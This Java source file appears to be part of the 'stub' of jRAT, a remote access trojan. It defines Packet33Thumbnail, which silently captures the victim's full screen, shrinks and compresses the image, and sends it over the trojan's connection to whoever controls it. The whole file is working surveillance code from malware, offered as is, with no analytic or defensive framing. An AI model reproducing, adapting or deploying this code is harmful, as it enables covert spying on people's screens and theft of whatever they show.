package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;
import io.jrat.common.utils.ImageUtils;
import io.jrat.common.utils.Utils;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.DataOutputStream;

public class Packet33Thumbnail extends AbstractOutgoingPacket {

	private int width;
	private int height;
	
	public Packet33Thumbnail(int width, int height) {
		this.width = width;
		this.height = height;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		if (!Utils.isHeadless()) {
			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
			BufferedImage screenShot = new Robot().createScreenCapture(screenRect);
			screenShot = ImageUtils.resize(screenShot, width, height);

			byte[] buffer = ImageUtils.encode(screenShot, 0.5F);
			dos.writeInt(buffer.length);
			dos.write(buffer);
		}
	}

	@Override
	public byte getPacketId() {
		return 33;
	}

}
